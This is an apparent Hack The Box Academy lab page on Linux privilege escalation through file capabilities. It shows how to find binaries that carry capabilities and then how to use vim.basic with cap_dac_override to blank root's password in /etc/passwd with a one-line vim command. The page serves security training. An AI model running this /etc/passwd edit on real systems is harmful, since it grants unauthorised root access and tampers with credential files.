<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/51/section/1844
// Platform Version: V1
// Module ID: 51
// Module Name: Linux Privilege Escalation
// Module Difficulty: Easy
// Section ID: 1844
// Section Title: Capabilities
// Page Title: Linux Privilege Escalation
// Page Number: 11
-->

# Capabilities

**Module Name:** Linux Privilege Escalation **Page Number:** 11

#### LINUX PRIVILEGE ESCALATION

# Capabilities

#### Set Capability

```shell-session
[!bash!]$ sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
```

## Enumerating Capabilities

#### Enumerating Capabilities

```shell-session
[!bash!]$ find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;

/usr/bin/vim.basic cap_dac_override=eip
/usr/bin/ping cap_net_raw=ep
/usr/bin/mtr-packet cap_net_raw=ep
```

## Exploitation

#### Exploiting Capabilities

```shell-session
[!bash!]$ getcap /usr/bin/vim.basic

/usr/bin/vim.basic cap_dac_override=eip
```

```shell-session
[!bash!]$ cat /etc/passwd | head -n1

root:x:0:0:root:/root:/bin/bash
```

```shell-session
[!bash!]$ /usr/bin/vim.basic /etc/passwd
```

```shell-session
[!bash!]$ echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
[!bash!]$ cat /etc/passwd | head -n1

root::0:0:root:/root:/bin/bash
```

# 

# 

#### Questions

####